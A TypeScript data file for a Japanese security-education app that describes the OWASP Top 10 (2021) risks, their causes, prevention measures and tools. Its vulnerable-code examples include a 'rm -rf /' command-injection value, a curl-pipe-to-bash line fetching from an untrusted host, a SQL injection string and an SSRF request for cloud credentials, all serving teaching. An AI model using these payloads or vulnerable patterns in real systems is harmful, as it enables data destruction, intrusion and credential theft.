/**
 * src/app/securities/owasp-top10/owasp-data.ts
 *
 * OWASP Top 10 (2021版) のデータ定義
 * 各リスクの詳細情報と対策方法を管理
 */

/**
 * OWASP Top 10のリスク項目の型定義
 */
export interface OwaspRisk {
	id: string;
	rank: number;
	code: string;
	name: string;
	nameJa: string;
	description: string;
	descriptionJa: string;
	causes: string[];
	impacts: string[];
	examples: {
		scenario: string;
		code?: string;
		vulnerability: string;
	}[];
	prevention: {
		title: string;
		measures: string[];
	}[];
	tools: string[];
	references: {
		title: string;
		url: string;
	}[];
}

/**
 * OWASP Top 10 (2021版) のデータ
 */
export const owaspTop10Data: OwaspRisk[] = [
	{
		id: "a01-broken-access-control",
		rank: 1,
		code: "A01:2021",
		name: "Broken Access Control",
		nameJa: "アクセス制御の不備",
		description:
			"Access control enforces policy such that users cannot act outside of their intended permissions.",
		descriptionJa:
			"アクセス制御は、ユーザーが意図された権限を超えて行動できないようにポリシーを強制します。不適切な実装により、認可されていないユーザーがリソースにアクセスできる脆弱性です。",
		causes: [
			"URLパラメータやAPIで権限チェックが不足",
			"セッション管理の不備",
			"CORS設定の誤り",
			"メタデータの操作（JWT、Cookie、hidden field）",
			"強制ブラウジング対策の不足",
		],
		impacts: [
			"機密データへの不正アクセス",
			"データの改ざん・削除",
			"権限昇格による管理機能の悪用",
			"アカウントの乗っ取り",
			"システム全体の侵害",
		],
		examples: [
			{
				scenario: "URLパラメータによる権限回避",
				code: `// 脆弱な例
app.get('/user/:id', (req, res) => {
  const userId = req.params.id;
  // 権限チェックなしでユーザー情報を返す
  const user = getUserById(userId);
  res.json(user);
});`,
				vulnerability:
					"任意のユーザーIDを指定することで、他人の情報にアクセス可能",
			},
			{
				scenario: "管理者機能への不正アクセス",
				code: `// 脆弱な例
<input type="hidden" name="isAdmin" value="false">
// 攻撃者がvalue="true"に変更可能`,
				vulnerability: "クライアント側の値を信頼して権限判定",
			},
		],
		prevention: [
			{
				title: "最小権限の原則",
				measures: [
					"デフォルトで全て拒否し、必要な権限のみ許可",
					"ロールベースアクセス制御（RBAC）の実装",
					"リソースレベルでの権限チェック",
				],
			},
			{
				title: "サーバーサイドでの検証",
				measures: [
					"全てのAPIエンドポイントで権限チェック",
					"セッション情報に基づく認可処理",
					"トークンの適切な検証（JWT署名確認など）",
				],
			},
			{
				title: "監査とログ",
				measures: [
					"アクセス制御違反の記録",
					"異常なアクセスパターンの検知",
					"定期的な権限レビュー",
				],
			},
		],
		tools: ["OWASP ZAP", "Burp Suite", "権限テスト自動化ツール"],
		references: [
			{
				title: "OWASP - Broken Access Control",
				url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
			},
		],
	},
	{
		id: "a02-cryptographic-failures",
		rank: 2,
		code: "A02:2021",
		name: "Cryptographic Failures",
		nameJa: "暗号化の失敗",
		description:
			"Previously known as Sensitive Data Exposure, focuses on failures related to cryptography which often lead to exposure of sensitive data.",
		descriptionJa:
			"以前は「機密データの露出」として知られ、暗号化に関連する失敗に焦点を当てています。これにより機密データが露出する可能性があります。",
		causes: [
			"平文での機密データ保存・送信",
			"弱い暗号アルゴリズムの使用",
			"不適切な鍵管理",
			"証明書検証の不備",
			"ランダム性の不足",
		],
		impacts: [
			"個人情報の漏洩",
			"認証情報の露出",
			"規制違反（GDPR、PCI-DSS等）",
			"企業の信頼性低下",
			"金銭的損失",
		],
		examples: [
			{
				scenario: "HTTPでの機密データ送信",
				code: `// 脆弱な例
<form action="http://example.com/login" method="POST">
  <input type="password" name="password">
</form>`,
				vulnerability: "パスワードが平文でネットワーク上を流れる",
			},
			{
				scenario: "弱いハッシュアルゴリズムの使用",
				code: `// 脆弱な例
const crypto = require('crypto');
const hash = crypto.createHash('md5').update(password).digest('hex');`,
				vulnerability: "MD5は既に破られており、パスワードハッシュには不適切",
			},
		],
		prevention: [
			{
				title: "適切な暗号化の実装",
				measures: [
					"全ての機密データをAES-256等の強力な暗号で保護",
					"転送時はTLS 1.2以上を使用",
					"パスワードにはbcrypt、scrypt、Argon2を使用",
				],
			},
			{
				title: "鍵管理のベストプラクティス",
				measures: [
					"ハードコーディングを避ける",
					"環境変数や専用の鍵管理システムを使用",
					"定期的な鍵のローテーション",
				],
			},
			{
				title: "データ分類と保護",
				measures: [
					"データの機密度に応じた分類",
					"必要最小限のデータ収集",
					"不要になったデータの安全な削除",
				],
			},
		],
		tools: ["SSLyze", "testssl.sh", "HashCat"],
		references: [
			{
				title: "OWASP - Cryptographic Failures",
				url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
			},
		],
	},
	{
		id: "a03-injection",
		rank: 3,
		code: "A03:2021",
		name: "Injection",
		nameJa: "インジェクション",
		description:
			"Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.",
		descriptionJa:
			"信頼できないデータがコマンドやクエリの一部としてインタープリタに送信される際に発生する脆弱性です。SQLインジェクション、NoSQLインジェクション、OSコマンドインジェクションなどが含まれます。",
		causes: [
			"ユーザー入力の検証不足",
			"動的クエリの不適切な構築",
			"パラメータ化クエリの未使用",
			"エスケープ処理の不備",
			"ストアドプロシージャの誤用",
		],
		impacts: [
			"データベースの完全な侵害",
			"データの盗難・改ざん・削除",
			"認証回避",
			"システムコマンドの実行",
			"サーバーの完全な乗っ取り",
		],
		examples: [
			{
				scenario: "SQLインジェクション",
				code: `// 脆弱な例
const query = "SELECT * FROM users WHERE id = '" + userId + "'";
db.query(query);

// 攻撃例: userId = "1' OR '1'='1"
// 実行されるクエリ: SELECT * FROM users WHERE id = '1' OR '1'='1'`,
				vulnerability: "全てのユーザー情報が取得される",
			},
			{
				scenario: "OSコマンドインジェクション",
				code: `// 脆弱な例
const filename = req.query.file;
exec('cat ' + filename);

// 攻撃例: filename = "test.txt; rm -rf /"`,
				vulnerability: "任意のOSコマンドが実行可能",
			},
		],
		prevention: [
			{
				title: "パラメータ化クエリの使用",
				measures: [
					"プリペアドステートメントの使用",
					"ストアドプロシージャの適切な実装",
					"ORMの安全な使用方法の徹底",
				],
			},
			{
				title: "入力検証とサニタイゼーション",
				measures: [
					"ホワイトリスト方式での入力検証",
					"特殊文字の適切なエスケープ",
					"文字列長とデータ型の検証",
				],
			},
			{
				title: "最小権限の原則",
				measures: [
					"データベースユーザーの権限制限",
					"不要なストアドプロシージャの削除",
					"読み取り専用接続の活用",
				],
			},
		],
		tools: ["SQLMap", "OWASP ZAP", "Burp Suite"],
		references: [
			{
				title: "OWASP - Injection",
				url: "https://owasp.org/Top10/A03_2021-Injection/",
			},
		],
	},
	{
		id: "a04-insecure-design",
		rank: 4,
		code: "A04:2021",
		name: "Insecure Design",
		nameJa: "安全でない設計",
		description:
			"A new category for 2021 focusing on risks related to design and architectural flaws.",
		descriptionJa:
			"2021年の新しいカテゴリで、設計とアーキテクチャの欠陥に関連するリスクに焦点を当てています。実装の問題ではなく、設計段階での根本的なセキュリティの欠如を指します。",
		causes: [
			"脅威モデリングの不足",
			"セキュアな設計パターンの不使用",
			"ビジネスロジックの脆弱性",
			"信頼境界の不明確さ",
			"セキュリティ要件の定義不足",
		],
		impacts: [
			"システム全体の脆弱性",
			"ビジネスロジックの悪用",
			"予期しない動作の発生",
			"修正コストの増大",
			"セキュリティ機能の回避",
		],
		examples: [
			{
				scenario: "質問ベースの認証システムの脆弱性",
				code: `// 設計上の問題例
// ユーザーが自分で秘密の質問と答えを設定
{
  "question": "好きな色は？",
  "answer": "青"
}`,
				vulnerability: "推測可能な質問と答えにより、アカウント乗っ取りが容易",
			},
			{
				scenario: "レート制限なしのAPIエンドポイント",
				code: `// 設計上の問題例
app.post('/api/transfer', (req, res) => {
  // レート制限なし
  transferMoney(req.body.amount, req.body.to);
});`,
				vulnerability: "ブルートフォース攻撃や大量送金が可能",
			},
		],
		prevention: [
			{
				title: "セキュア設計の原則",
				measures: [
					"設計段階での脅威モデリング",
					"セキュリティアーキテクチャパターンの採用",
					"ゼロトラストアーキテクチャの検討",
				],
			},
			{
				title: "設計レビューとテスト",
				measures: [
					"セキュリティ設計レビューの実施",
					"ペネトレーションテストの計画",
					"レッドチーム演習の実施",
				],
			},
			{
				title: "要件定義での対策",
				measures: [
					"セキュリティ要件の明文化",
					"悪用ケースの検討",
					"セキュアコーディング標準の策定",
				],
			},
		],
		tools: [
			"Microsoft Threat Modeling Tool",
			"OWASP Threat Dragon",
			"IriusRisk",
		],
		references: [
			{
				title: "OWASP - Insecure Design",
				url: "https://owasp.org/Top10/A04_2021-Insecure_Design/",
			},
		],
	},
	{
		id: "a05-security-misconfiguration",
		rank: 5,
		code: "A05:2021",
		name: "Security Misconfiguration",
		nameJa: "セキュリティの設定ミス",
		description:
			"Security misconfiguration is the most commonly seen issue resulting from insecure default configurations, incomplete setups, or misconfigured systems.",
		descriptionJa:
			"セキュリティの設定ミスは、安全でないデフォルト設定、不完全なセットアップ、または誤って設定されたシステムから生じる最も一般的な問題です。",
		causes: [
			"デフォルト設定の使用",
			"不要な機能・サービスの有効化",
			"エラーメッセージの詳細表示",
			"セキュリティヘッダーの欠如",
			"パッチ適用の遅延",
		],
		impacts: [
			"システム情報の漏洩",
			"不正アクセスの増加",
			"既知の脆弱性の悪用",
			"内部構造の露出",
			"攻撃の足がかり提供",
		],
		examples: [
			{
				scenario: "詳細なエラーメッセージの表示",
				code: `// 脆弱な例
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // スタックトレースを露出
    query: req.query  // デバッグ情報を露出
  });
});`,
				vulnerability: "内部構造やデータベース情報が攻撃者に露出",
			},
			{
				scenario: "セキュリティヘッダーの欠如",
				code: `// 脆弱な例
// X-Frame-Options ヘッダーなし
// Content-Security-Policy ヘッダーなし
// X-Content-Type-Options ヘッダーなし`,
				vulnerability: "クリックジャッキングやXSS攻撃に脆弱",
			},
		],
		prevention: [
			{
				title: "セキュアな設定管理",
				measures: [
					"本番環境用の強化された設定",
					"自動化された設定管理ツールの使用",
					"最小限の機能のみ有効化",
				],
			},
			{
				title: "定期的な監査と更新",
				measures: [
					"設定の定期的なレビュー",
					"セキュリティパッチの迅速な適用",
					"脆弱性スキャンの実施",
				],
			},
			{
				title: "環境の分離",
				measures: [
					"開発・テスト・本番環境の分離",
					"環境ごとの適切な設定",
					"シークレット管理の徹底",
				],
			},
		],
		tools: ["Nmap", "OpenVAS", "Lynis", "CIS-CAT"],
		references: [
			{
				title: "OWASP - Security Misconfiguration",
				url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
			},
		],
	},
	{
		id: "a06-vulnerable-components",
		rank: 6,
		code: "A06:2021",
		name: "Vulnerable and Outdated Components",
		nameJa: "脆弱で古いコンポーネント",
		description:
			"Using components with known vulnerabilities makes applications susceptible to attacks.",
		descriptionJa:
			"既知の脆弱性を持つコンポーネントを使用することで、アプリケーションが攻撃を受けやすくなります。ライブラリ、フレームワーク、その他のソフトウェアモジュールが含まれます。",
		causes: [
			"依存関係の管理不足",
			"脆弱性情報の追跡不足",
			"アップデートの遅延",
			"不要な依存関係の放置",
			"ライセンス管理の不備",
		],
		impacts: [
			"既知の脆弱性の悪用",
			"システム全体の侵害",
			"データ漏洩",
			"サービス停止",
			"サプライチェーン攻撃",
		],
		examples: [
			{
				scenario: "古いライブラリの使用",
				code: `// package.json の例
{
  "dependencies": {
    "express": "3.0.0",  // 多数の既知の脆弱性
    "lodash": "4.17.4",  // prototype pollution 脆弱性
    "jquery": "2.1.4"    // XSS脆弱性
  }
}`,
				vulnerability: "既知の脆弱性が多数存在し、攻撃可能",
			},
			{
				scenario: "脆弱なDockerイメージの使用",
				code: `# Dockerfile の例
FROM node:8-alpine  # サポート終了、脆弱性多数`,
				vulnerability: "基盤となるOSとNode.jsに脆弱性",
			},
		],
		prevention: [
			{
				title: "依存関係の管理",
				measures: [
					"ソフトウェア構成管理（SBOM）の作成",
					"依存関係の定期的な更新",
					"不要な依存関係の削除",
				],
			},
			{
				title: "脆弱性の監視",
				measures: [
					"自動脆弱性スキャンの実装",
					"CVEデータベースの監視",
					"セキュリティアドバイザリの購読",
				],
			},
			{
				title: "アップデート戦略",
				measures: [
					"パッチ管理プロセスの確立",
					"テスト環境での事前検証",
					"ロールバック計画の準備",
				],
			},
		],
		tools: ["npm audit", "Snyk", "OWASP Dependency-Check", "GitHub Dependabot"],
		references: [
			{
				title: "OWASP - Vulnerable and Outdated Components",
				url: "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
			},
		],
	},
	{
		id: "a07-auth-failures",
		rank: 7,
		code: "A07:2021",
		name: "Identification and Authentication Failures",
		nameJa: "識別と認証の失敗",
		description:
			"Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks.",
		descriptionJa:
			"ユーザーの身元確認、認証、セッション管理は、認証関連の攻撃から保護するために重要です。パスワード攻撃、セッションハイジャック、多要素認証の回避などが含まれます。",
		causes: [
			"弱いパスワードポリシー",
			"不適切なセッション管理",
			"多要素認証の欠如",
			"認証情報の平文保存",
			"ブルートフォース対策の不足",
		],
		impacts: [
			"アカウントの乗っ取り",
			"なりすまし",
			"個人情報の漏洩",
			"権限昇格",
			"大規模なデータ侵害",
		],
		examples: [
			{
				scenario: "弱いパスワードの許可",
				code: `// 脆弱な例
function validatePassword(password) {
  return password.length >= 4; // 4文字以上なら許可
}`,
				vulnerability: "簡単に推測・破解可能なパスワード",
			},
			{
				scenario: "セッション固定攻撃",
				code: `// 脆弱な例
// ログイン後もセッションIDを変更しない
app.post('/login', (req, res) => {
  if (authenticate(req.body.username, req.body.password)) {
    req.session.authenticated = true;
    // セッションIDの再生成なし
  }
});`,
				vulnerability: "攻撃者が事前に設定したセッションIDでなりすまし可能",
			},
		],
		prevention: [
			{
				title: "強力な認証メカニズム",
				measures: [
					"多要素認証（MFA）の実装",
					"強力なパスワードポリシーの強制",
					"パスワードレス認証の検討",
				],
			},
			{
				title: "セッション管理の強化",
				measures: [
					"ログイン後のセッションID再生成",
					"適切なセッションタイムアウト",
					"セキュアなCookie設定（HttpOnly, Secure, SameSite）",
				],
			},
			{
				title: "攻撃対策",
				measures: [
					"ログイン試行回数の制限",
					"アカウントロックアウト機能",
					"異常なログイン検知とアラート",
				],
			},
		],
		tools: ["Hydra", "John the Ripper", "OWASP ZAP"],
		references: [
			{
				title: "OWASP - Identification and Authentication Failures",
				url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
			},
		],
	},
	{
		id: "a08-software-data-integrity",
		rank: 8,
		code: "A08:2021",
		name: "Software and Data Integrity Failures",
		nameJa: "ソフトウェアとデータの整合性の失敗",
		description:
			"Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations.",
		descriptionJa:
			"ソフトウェアとデータの整合性の失敗は、整合性違反から保護されていないコードとインフラストラクチャに関連します。CI/CDパイプライン、自動更新、信頼できないソースからのコードなどが含まれます。",
		causes: [
			"署名されていないソフトウェアの使用",
			"CI/CDパイプラインの脆弱性",
			"信頼できないソースからの更新",
			"シリアライゼーションの脆弱性",
			"整合性チェックの欠如",
		],
		impacts: [
			"悪意のあるコードの注入",
			"サプライチェーン攻撃",
			"データの改ざん",
			"システムの完全な侵害",
			"バックドアの設置",
		],
		examples: [
			{
				scenario: "安全でないデシリアライゼーション",
				code: `// 脆弱な例 (Python)
import pickle
user_data = pickle.loads(request.data) # 信頼できないデータ`,
				vulnerability: "任意のコード実行が可能",
			},
			{
				scenario: "CI/CDパイプラインへの不正コード注入",
				code: `# 脆弱な例 (.github/workflows/deploy.yml)
- name: Deploy
  run: |
    curl http://untrusted-source.com/deploy.sh | bash`,
				vulnerability: "信頼できないスクリプトの実行",
			},
		],
		prevention: [
			{
				title: "整合性の検証",
				measures: [
					"デジタル署名の検証",
					"チェックサムの確認",
					"ソフトウェア部品表（SBOM）の管理",
				],
			},
			{
				title: "セキュアなCI/CD",
				measures: [
					"パイプラインのアクセス制御",
					"ビルド環境の隔離",
					"成果物の署名と検証",
				],
			},
			{
				title: "信頼できるソースの使用",
				measures: [
					"公式リポジトリからのみ取得",
					"依存関係のピン留め",
					"プライベートレジストリの使用",
				],
			},
		],
		tools: ["Sigstore", "in-toto", "The Update Framework (TUF)"],
		references: [
			{
				title: "OWASP - Software and Data Integrity Failures",
				url: "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
			},
		],
	},
	{
		id: "a09-logging-monitoring",
		rank: 9,
		code: "A09:2021",
		name: "Security Logging and Monitoring Failures",
		nameJa: "セキュリティログとモニタリングの失敗",
		description:
			"Without logging and monitoring, breaches cannot be detected. Insufficient logging and monitoring allows attackers to persist in systems undetected.",
		descriptionJa:
			"ログとモニタリングがなければ、侵害を検出できません。不十分なログとモニタリングにより、攻撃者はシステム内で検出されずに活動を継続できます。",
		causes: [
			"重要イベントのログ不足",
			"ログの保護不足",
			"アラート設定の不備",
			"ログ分析の欠如",
			"インシデント対応計画の不足",
		],
		impacts: [
			"侵害の検出遅延",
			"攻撃の長期化",
			"被害の拡大",
			"フォレンジックの困難",
			"コンプライアンス違反",
		],
		examples: [
			{
				scenario: "認証失敗のログ不足",
				code: `// 脆弱な例
app.post('/login', (req, res) => {
  if (!authenticate(req.body.username, req.body.password)) {
    // ログなし
    return res.status(401).send('Login failed');
  }
});`,
				vulnerability: "ブルートフォース攻撃を検出できない",
			},
			{
				scenario: "ログの保護不足",
				code: `// 脆弱な例
logger.info('User logged in: ' + username + ', password: ' + password);`,
				vulnerability: "機密情報がログに記録される",
			},
		],
		prevention: [
			{
				title: "包括的なログ戦略",
				measures: [
					"認証、アクセス制御、入力検証エラーのログ",
					"高価値トランザクションの記録",
					"ログフォーマットの標準化",
				],
			},
			{
				title: "ログの保護と管理",
				measures: [
					"ログの暗号化と完全性保護",
					"適切なログローテーション",
					"機密情報のマスキング",
				],
			},
			{
				title: "監視とアラート",
				measures: [
					"リアルタイム監視の実装",
					"異常検知の自動化",
					"インシデント対応手順の確立",
				],
			},
		],
		tools: ["ELK Stack", "Splunk", "Datadog", "SIEM solutions"],
		references: [
			{
				title: "OWASP - Security Logging and Monitoring Failures",
				url: "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/",
			},
		],
	},
	{
		id: "a10-ssrf",
		rank: 10,
		code: "A10:2021",
		name: "Server-Side Request Forgery (SSRF)",
		nameJa: "サーバーサイドリクエストフォージェリ",
		description:
			"SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL.",
		descriptionJa:
			"SSRFの脆弱性は、Webアプリケーションがユーザー指定のURLを検証せずにリモートリソースを取得する際に発生します。内部ネットワークへの攻撃や機密情報の取得に悪用されます。",
		causes: [
			"URLパラメータの検証不足",
			"内部リソースへのアクセス制限不足",
			"リダイレクトの不適切な処理",
			"URLパーサーの脆弱性",
			"クラウドメタデータへのアクセス",
		],
		impacts: [
			"内部システムの偵察",
			"内部サービスへの攻撃",
			"機密データの窃取",
			"クラウド認証情報の取得",
			"サービス拒否攻撃",
		],
		examples: [
			{
				scenario: "内部ネットワークへのアクセス",
				code: `// 脆弱な例
app.get('/fetch-url', async (req, res) => {
  const url = req.query.url;
  // URLの検証なし
  const response = await fetch(url);
  res.send(await response.text());
});

// 攻撃例: ?url=http://192.168.1.1/admin`,
				vulnerability: "内部ネットワークの管理画面にアクセス可能",
			},
			{
				scenario: "クラウドメタデータの取得",
				code: `// 攻撃例
GET /fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
				vulnerability: "AWS認証情報の取得",
			},
		],
		prevention: [
			{
				title: "入力検証とフィルタリング",
				measures: [
					"URLのホワイトリスト検証",
					"プライベートIPアドレスのブロック",
					"URLスキームの制限（HTTPSのみ等）",
				],
			},
			{
				title: "ネットワーク分離",
				measures: [
					"DMZの適切な設定",
					"内部サービスへのアクセス制限",
					"ゼロトラストネットワーク設計",
				],
			},
			{
				title: "安全な実装パターン",
				measures: [
					"プロキシサービスの使用",
					"URLの正規化と検証",
					"レスポンスの検証とサニタイズ",
				],
			},
		],
		tools: ["SSRFmap", "Gopherus", "OWASP ZAP"],
		references: [
			{
				title: "OWASP - Server-Side Request Forgery",
				url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
			},
		],
	},
];

/**
 * リスクレベルに応じた色を取得
 */
export const getRiskColor = (rank: number): string => {
	if (rank <= 3) return "text-red-600 dark:text-red-400";
	if (rank <= 7) return "text-orange-600 dark:text-orange-400";
	return "text-yellow-600 dark:text-yellow-400";
};

/**
 * リスクレベルに応じた背景色を取得
 */
export const getRiskBgColor = (rank: number): string => {
	if (rank <= 3) return "bg-red-50 dark:bg-red-900/20";
	if (rank <= 7) return "bg-orange-50 dark:bg-orange-900/20";
	return "bg-yellow-50 dark:bg-yellow-900/20";
};

/**
 * リスクレベルに応じたボーダー色を取得
 */
export const getRiskBorderColor = (rank: number): string => {
	if (rank <= 3) return "border-red-200 dark:border-red-700";
	if (rank <= 7) return "border-orange-200 dark:border-orange-700";
	return "border-yellow-200 dark:border-yellow-700";
};
